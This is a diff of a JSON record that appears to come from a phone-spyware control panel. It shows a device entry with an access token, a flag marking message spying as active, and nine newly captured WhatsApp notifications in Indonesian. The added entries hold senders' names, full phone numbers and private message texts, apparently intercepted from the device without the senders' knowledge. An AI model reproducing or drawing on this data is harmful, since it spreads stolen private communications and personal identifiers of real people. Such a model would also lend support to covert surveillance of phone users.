@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776853487384,
+    "lastSeen": 1776853511404,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,78 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "prily 🤍",
+        "content": "tau aku juga namanya aja omar",
+        "time": "22/04 18:25",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776853511691
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎58 pesan dari 36 chat",
+        "time": "22/04 18:25",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776853511681
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎57 pesan dari 36 chat",
+        "time": "22/04 18:24",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776853487817
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "prily 🤍",
+        "content": "abis ngeringin rambut seng",
+        "time": "22/04 18:24",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776853487796
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Meii",
+        "content": "masih",
+        "time": "22/04 18:24",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776853487721
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Rafly",
+        "content": "kalo mau nunggu bang reno ini",
+        "time": "22/04 18:24",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776853487710
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 851-3406-5819",
+        "content": "Oke",
+        "time": "22/04 18:24",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776853487631
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Muhammad Amal Ardhafan",
+        "content": "Semangat ma disana",
+        "time": "22/04 18:24",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776853487584
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 823-1199-7104",
+        "content": "Balik sore kmr16 kemarin aku kasih di kmr17",
+        "time": "22/04 18:24",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776853487568
+      },
       {
         "appName": "WhatsApp",
         "sender": "+62 851-1746-5790",
